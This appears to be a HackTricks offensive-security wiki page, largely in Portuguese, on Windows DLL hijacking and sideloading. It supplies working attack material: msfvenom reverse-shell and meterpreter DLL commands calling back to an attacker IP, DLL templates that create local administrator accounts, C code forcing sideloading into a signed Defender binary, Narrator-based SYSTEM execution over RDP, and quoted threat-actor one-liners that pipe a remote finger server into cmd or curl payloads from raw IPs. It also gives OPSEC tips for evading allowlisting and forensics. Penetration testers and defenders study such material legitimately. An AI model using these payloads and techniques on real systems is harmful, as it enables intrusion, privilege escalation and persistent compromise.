# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informação Básica

DLL Hijacking envolve manipular um aplicativo confiável para carregar uma DLL maliciosa. Este termo abrange várias táticas como **DLL Spoofing, Injection, and Side-Loading**. É usado principalmente para execução de código, obtenção de persistência e, menos comumente, escalada de privilégios. Apesar do foco na escalada aqui, o método de hijacking permanece consistente entre os objetivos.

### Técnicas Comuns

Vários métodos são empregados para DLL hijacking, cada um com sua efetividade dependendo da estratégia de carregamento de DLLs do aplicativo:

1. **DLL Replacement**: Substituir uma DLL legítima por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de busca antes da legítima, explorando o padrão de busca do aplicativo.
3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa que o aplicativo carregará, acreditando ser uma DLL requerida inexistente.
4. **DLL Redirection**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar o aplicativo para a DLL maliciosa.
5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma contraparte maliciosa no diretório WinSxS, um método frequentemente associado com DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário juntamente com o aplicativo copiado, assemelhando-se a técnicas de Binary Proxy Execution.

> [!TIP]
> Para uma cadeia passo a passo que empilha HTML staging, configurações AES-CTR e implantes .NET sobre DLL sideloading, reveja o workflow abaixo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

A maneira mais comum de encontrar Dlls faltantes dentro de um sistema é executar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **configurando** os **seguintes 2 filtros**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e mostrar apenas a **File System Activity**:

![](<../../../images/image (153).png>)

Se você está procurando por **missing dlls in general** você **deixa** isso rodando por alguns **segundos**.\
Se você está procurando por uma **missing dll inside an specific executable** você deve definir **outro filtro como "Process Name" "contains" `<exec name>`, executá-lo, e parar de capturar eventos**.

## Exploiting Missing Dlls

Para escalar privilégios, a melhor chance que temos é poder **escrever uma dll que um processo privilegiado tentará carregar** em algum **local onde ela será procurada**. Portanto, poderemos **escrever** uma dll em uma **pasta** onde a **dll é procurada antes** da pasta onde a **dll original** está (caso estranho), ou seremos capazes de **escrever em alguma pasta onde a dll será procurada** e a **dll original não exista** em nenhuma pasta.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Aplicativos Windows procuram DLLs seguindo um conjunto de **caminhos de busca predefinidos**, obedecendo a uma sequência particular. O problema do DLL hijacking surge quando uma DLL maliciosa é colocada estrategicamente em um desses diretórios, fazendo com que seja carregada antes da DLL autêntica. Uma solução para prevenir isso é certificar-se de que o aplicativo use caminhos absolutos ao referenciar as DLLs de que necessita.

Você pode ver a **DLL search order on 32-bit** systems abaixo:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Essa é a ordem de busca **padrão** com o **SafeDllSearchMode** habilitado. Quando está desabilitado, o diretório atual sobe para a segunda posição. Para desabilitar esse recurso, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (por padrão está habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD_WITH_ALTERED_SEARCH_PATH**, a busca começa no diretório do módulo executável que o **LoadLibraryEx** está carregando.

Finalmente, note que **uma dll pode ser carregada indicando o caminho absoluto em vez de apenas o nome**. Nesse caso, essa dll **será procurada apenas nesse caminho** (se a dll tiver dependências, elas serão procuradas como se tivessem sido carregadas apenas pelo nome).

Existem outras maneiras de alterar a ordem de busca, mas não vou explicá-las aqui.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Uma maneira avançada de influenciar deterministically o caminho de busca de DLL de um processo recém-criado é definir o campo DllPath em RTL_USER_PROCESS_PARAMETERS ao criar o processo com as APIs nativas de ntdll. Ao fornecer um diretório controlado pelo atacante aqui, um processo alvo que resolve uma DLL importada pelo nome (sem caminho absoluto e não usando as flags de carregamento seguro) pode ser forçado a carregar uma DLL maliciosa desse diretório.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemplo de uso operacional
- Coloque um xmllite.dll malicioso (exportando as funções requeridas ou fazendo proxy para o real) no seu diretório DllPath.
- Execute um binário assinado conhecido por procurar xmllite.dll pelo nome usando a técnica acima. O loader resolve a importação via o DllPath fornecido e sideloads seu DLL.

Essa técnica foi observada in-the-wild para conduzir cadeias de sideloading multi-estágios: um launcher inicial deposita um DLL auxiliar, que então instancia um binário Microsoft-signed, hijackable, com um DllPath customizado para forçar o carregamento do DLL do atacante a partir de um diretório de staging.


#### Exceptions on dll search order from Windows docs

Certas exceções à ordem padrão de busca de DLL são apontadas na documentação do Windows:

- Quando um **DLL that shares its name with one already loaded in memory** é encontrado, o sistema ignora a busca usual. Em vez disso, ele realiza uma verificação por redirection e um manifest antes de utilizar por padrão o DLL já carregado na memória. **Nesse cenário, o sistema não realiza uma busca pelo DLL**.
- Nos casos em que o DLL é reconhecido como um **known DLL** para a versão atual do Windows, o sistema utilizará sua versão do known DLL, juntamente com quaisquer DLLs dependentes, **dispensando o processo de busca**. A chave de registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém a lista desses known DLLs.
- Caso um **DLL have dependencies**, a busca por esses DLLs dependentes é conduzida como se eles tivessem sido indicados apenas pelos seus **module names**, independentemente de o DLL inicial ter sido identificado via um caminho completo.

### Escalating Privileges

**Requirements**:

- Identificar um processo que opere ou venha a operar sob **different privileges** (horizontal or lateral movement), que esteja **lacking a DLL**.
- Garantir que exista **write access** em qualquer **directory** no qual o **DLL** será **searched for**. Essa localização pode ser o diretório do executável ou um diretório dentro do system path.

Sim, os requisitos são complicados de encontrar já que **por padrão é meio estranho achar um executável privilegiado sem um dll** e é ainda **mais estranho ter permissões de escrita em uma pasta do system path** (por padrão você não pode). Mas, em ambientes mal configurados isso é possível.\
No caso de você ter sorte e encontrar que atende aos requisitos, você pode checar o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **main goal of the project is bypass UAC**, você pode encontrar lá um **PoC** de um Dll hijaking para a versão do Windows que você está usando (provavelmente só precisando mudar o caminho da pasta onde você tem permissões de escrita).

Note que você pode **check your permissions in a folder** fazendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro do PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar os imports de um executável e os exports de uma dll com:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo sobre como **abusar Dll Hijacking para escalar privilégios** com permissões para escrever em uma **pasta do PATH do sistema**, consulte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Ferramentas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verá se você tem permissões de escrita em qualquer pasta dentro do PATH do sistema.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as **funções do PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Se você encontrar um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso é **criar uma dll que exporte pelo menos todas as funções que o executável irá importar dela**. Observe que Dll Hijacking é útil para [escalar de Medium Integrity level para High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de [**High Integrity para SYSTEM**](../index.html#from-high-integrity-to-system). Você pode encontrar um exemplo de **como criar uma dll válida** neste estudo sobre dll hijacking focado em dll hijacking para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Além disso, na **próxima seção** você pode encontrar alguns **códigos básicos de dll** que podem ser úteis como **modelos** ou para criar uma **dll com funções não necessárias exportadas**.

## **Criando e compilando Dlls**

### **Dll Proxifying**

Basicamente um **Dll proxy** é uma Dll capaz de **executar seu código malicioso quando carregada**, mas também de **expor** e **funcionar** como **esperado** ao **reencaminhar todas as chamadas para a biblioteca real**.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) você pode indicar um executável e selecionar a biblioteca que deseja proxificar e gerar uma dll proxificada ou indicar a Dll e gerar uma dll proxificada.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenha um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86, não vi uma versão x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

Observe que, em vários casos, o Dll que você compilar deve **export several functions** que serão carregadas pelo victim process; se these functions doesn't exist, o **binary won't be able to load** them e o **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemplo de DLL C++ com criação de usuário</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativa C DLL com thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudo de Caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

O Windows Narrator.exe ainda procura uma DLL de localização previsível e específica por idioma na inicialização que pode ser hijacked para arbitrary code execution e persistence.

Fatos principais
- Caminho de sondagem (builds atuais): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Caminho legado (versões mais antigas): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se uma DLL controlada pelo atacante e gravável existir no caminho do OneCore, ela é carregada e `DllMain(DLL_PROCESS_ATTACH)` executa. Nenhuma exportação é necessária.

Descoberta com Procmon
- Filtro: `Process Name is Narrator.exe` e `Operation is Load Image` ou `CreateFile`.
- Inicie o Narrator e observe a tentativa de carregamento do caminho acima.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- Contexto do usuário (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Com o acima, iniciar Narrator carrega a DLL plantada. No desktop seguro (tela de logon), pressione CTRL+WIN+ENTER para iniciar Narrator; sua DLL será executada como SYSTEM no desktop seguro.

RDP-triggered SYSTEM execution (lateral movement)
- Permitir camada de segurança RDP clássica: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conecte via RDP ao host, na tela de logon pressione CTRL+WIN+ENTER para iniciar Narrator; sua DLL será executada como SYSTEM no desktop seguro.
- A execução para quando a sessão RDP é encerrada — injete/migre rapidamente.

Bring Your Own Accessibility (BYOA)
- Você pode clonar uma entrada de registro de Accessibility Tool (AT) embutida (por exemplo, CursorIndicator), editá-la para apontar para um binário/DLL arbitrário, importá-la e então definir `configuration` para esse nome de AT. Isso fornece execução arbitrária via o framework de Accessibility.

Notas
- Gravar em `%windir%\System32` e alterar valores em HKLM requer privilégios de administrador.
- Toda lógica do payload pode residir em `DLL_PROCESS_ATTACH`; não são necessários exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Este caso demonstra **Phantom DLL Hijacking** no TrackPoint Quick Menu da Lenovo (`TPQMAssistant.exe`), rastreado como **CVE-2025-1729**.

### Detalhes da Vulnerabilidade

- **Componente**: `TPQMAssistant.exe` localizado em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tarefa Agendada**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` roda diariamente às 9:30 sob o contexto do usuário logado.
- **Permissões do Diretório**: Gravável por `CREATOR OWNER`, permitindo que usuários locais deixem arquivos arbitrários.
- **Comportamento de Busca de DLL**: Tenta carregar `hostfxr.dll` do seu diretório de trabalho primeiro e registra "NAME NOT FOUND" se ausente, indicando precedência de busca no diretório local.

### Implementação do Exploit

Um atacante pode colocar um stub malicioso `hostfxr.dll` no mesmo diretório, explorando a DLL ausente para obter execução de código no contexto do usuário:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Fluxo de Ataque

1. Como usuário padrão, coloque `hostfxr.dll` em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Aguarde a tarefa agendada executar às 9:30 AM no contexto do usuário atual.
3. Se um administrador estiver logado quando a tarefa executar, a DLL maliciosa será executada na sessão do administrador com integridade média.
4. Encadear técnicas padrão de UAC bypass para elevar de integridade média para privilégios SYSTEM.

## Estudo de Caso: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Atores de ameaça frequentemente combinam MSI-based droppers com DLL side-loading para executar payloads sob um processo confiável e assinado.

Chain overview
- Usuário baixa o MSI. Uma CustomAction é executada silenciosamente durante a instalação GUI (ex.: LaunchApplication ou uma ação VBScript), reconstruindo a próxima etapa a partir de recursos embutidos.
- O dropper grava um EXE legítimo e assinado e uma DLL maliciosa no mesmo diretório (par de exemplo: Avast-signed wsc_proxy.exe + wsc.dll controlada pelo atacante).
- Quando o EXE assinado é iniciado, a ordem de busca de DLLs do Windows carrega wsc.dll do diretório de trabalho primeiro, executando código do atacante sob um pai assinado (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Procure por entradas que executem executáveis ou VBScript. Padrão suspeito exemplo: LaunchApplication executando um arquivo embutido em segundo plano.
- No Orca (Microsoft Orca.exe), inspecione as tabelas CustomAction, InstallExecuteSequence e Binary.
- Payloads embutidos/divididos no CAB do MSI:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Procure por múltiplos fragmentos pequenos que são concatenados e descriptografados por uma CustomAction VBScript. Fluxo comum:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Prático sideloading com wsc_proxy.exe
- Coloque estes dois arquivos na mesma pasta:
- wsc_proxy.exe: host legítimo assinado (Avast). O processo tenta carregar wsc.dll pelo nome a partir do seu diretório.
- wsc.dll: attacker DLL. Se nenhum export específico for necessário, DllMain pode ser suficiente; caso contrário, construa um proxy DLL e encaminhe os exports necessários para a biblioteca genuína enquanto executa o payload em DllMain.
- Crie um payload DLL mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportação, use um framework de proxy (por exemplo, DLLirant/Spartacus) para gerar um DLL de encaminhamento que também execute seu payload.

- Esta técnica depende da resolução do nome do DLL pelo binário host. Se o host usa caminhos absolutos ou flags de carregamento seguro (por exemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack pode falhar.
- KnownDLLs, SxS e forwarded exports podem influenciar a precedência e devem ser considerados ao selecionar o binário host e o conjunto de exports.

## Triades assinadas + payloads criptografados (ShadowPad case study)

Check Point descreveu como Ink Dragon implanta ShadowPad usando uma **tríade de três arquivos** para se misturar com software legítimo enquanto mantém o payload principal criptografado no disco:

1. **Signed host EXE** – vendors como AMD, Realtek ou NVIDIA são abusados (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Os atacantes renomeiam o executável para parecer um binário Windows (por exemplo `conhost.exe`), mas a assinatura Authenticode permanece válida.
2. **Malicious loader DLL** – dropada ao lado do EXE com um nome esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). A DLL é geralmente um binário MFC ofuscado com o framework ScatterBrain; seu único trabalho é localizar o blob criptografado, descriptografá-lo e mapear ShadowPad refletivamente.
3. **Encrypted payload blob** – frequentemente armazenado como `<name>.tmp` no mesmo diretório. Após mapear em memória o payload descriptografado, o loader deleta o arquivo TMP para destruir evidências forenses.

Notas de tradecraft:

* Renomear o EXE assinado (mantendo o `OriginalFileName` original no cabeçalho PE) permite que ele se passe por um binário Windows e ainda retenha a assinatura do vendor, então replique o hábito do Ink Dragon de dropar binários com aparência `conhost.exe` que na verdade são utilitários AMD/NVIDIA.
* Porque o executável permanece confiável, a maioria dos controles de allowlisting normalmente só precisa que sua DLL maliciosa fique ao lado dele. Foque em customizar a loader DLL; o pai assinado normalmente pode rodar sem alterações.
* O decryptor do ShadowPad espera que o blob TMP esteja ao lado do loader e seja gravável para que possa zerar o arquivo após o mapeamento. Mantenha o diretório gravável até o payload carregar; uma vez em memória o arquivo TMP pode ser apagado com segurança por OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operadores emparelham DLL sideloading com LOLBAS de modo que o único artefato customizado no disco seja a DLL maliciosa ao lado do EXE confiável:

- **Remote command loader (Finger):** PowerShell oculto spawn `cmd.exe /c`, puxa comandos de um servidor Finger e os pipeia para `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` puxa texto TCP/79; `| cmd` executa a resposta do servidor, permitindo que operadores rotacionem o segundo estágio no servidor.

- **Built-in download/extract:** Baixe um archive com uma extensão benign, descompacte-o e stageie o alvo de sideload mais a DLL sob uma pasta aleatória em `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta progresso e segue redirects; `tar -xf` usa o tar built-in do Windows.

- **WMI/CIM launch:** Inicie o EXE via WMI para que a telemetria mostre um processo criado por CIM enquanto ele carrega a DLL colocada ao lado:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona com binários que preferem DLLs locais (p.ex., `intelbq.exe`, `nearby_share.exe`); o payload (p.ex., Remcos) roda sob o nome confiável.

- **Hunting:** Alerta em `forfiles` quando `/p`, `/m` e `/c` aparecem juntos; incomum fora de scripts administrativos.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uma intrusão recente do Lotus Blossom abusou de uma cadeia de update confiável para entregar um dropper empacotado com NSIS que stageou um DLL sideload mais payloads totalmente em memória.

Tradecraft flow
- `update.exe` (NSIS) cria `%AppData%\Bluetooth`, marca como **HIDDEN**, dropa um Bitdefender Submission Wizard renomeado `BluetoothService.exe`, um `log.dll` malicioso, e um blob criptografado `BluetoothService`, então lança o EXE.
- O EXE host importa `log.dll` e chama `LogInit`/`LogWrite`. `LogInit` mmap-loads o blob; `LogWrite` descriptografa com um stream custom baseado em LCG (constantes **0x19660D** / **0x3C6EF35F**, material de chave derivado de um hash anterior), sobrescreve o buffer com shellcode em texto simples, libera temps e pula para ele.
- Para evitar uma IAT, o loader resolve APIs hasheando nomes de exports usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, então aplicando um avalanche estilo Murmur (**0x85EBCA6B**) e comparando contra hashes alvo salteados.

Main shellcode (Chrysalis)
- Descriptografa um módulo principal tipo PE repetindo add/XOR/sub com a chave `gQ2JR&9;` por cinco passes, então carrega dinamicamente `Kernel32.dll` → `GetProcAddress` para finalizar a resolução de imports.
- Reconstrói strings de nomes de DLL em tempo de execução via transformações por carácter de bit-rotate/XOR, então carrega `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa um segundo resolver que percorre o **PEB → InMemoryOrderModuleList**, analisa cada export table em blocos de 4 bytes com mistura estilo Murmur, e só recorre a `GetProcAddress` se o hash não for encontrado.

Embedded configuration & C2
- A config vive dentro do arquivo dropado `BluetoothService` no **offset 0x30808** (tamanho **0x980**) e é RC4-decrypted com a chave `qwhvb^435h&*7`, revelando a URL de C2 e o User-Agent.
- Beacons constroem um profile host delimitado por pontos, prefixam a tag `4Q`, então RC4-encryptam com a chave `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. Respostas são RC4-decrypted e despachadas por um switch de tags (`4T` shell, `4V` exec de processo, `4W/4X` write de arquivo, `4Y` read/exfil, `4\\` uninstall, `4` enum de drive/arquivo + casos de transferência chunked).
- O modo de execução é controlado por args de CLI: sem args = instalar persistência (service/Run key) apontando para `-i`; `-i` relança a si mesmo com `-k`; `-k` pula a instalação e executa o payload.

Alternate loader observed
- A mesma intrusão dropou Tiny C Compiler e executou `svchost.exe -nostdlib -run conf.c` a partir de `C:\ProgramData\USOShared\`, com `libtcc.dll` ao lado. O código C fornecido pelo atacante embutia shellcode, compilava e rodava em memória sem tocar o disco com um PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa TCC-based de compile-and-run importou `Wininet.dll` em tempo de execução e baixou um shellcode de segunda etapa de uma URL hardcoded, fornecendo um loader flexível que se disfarça como uma execução de compilador run.

## Referências

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
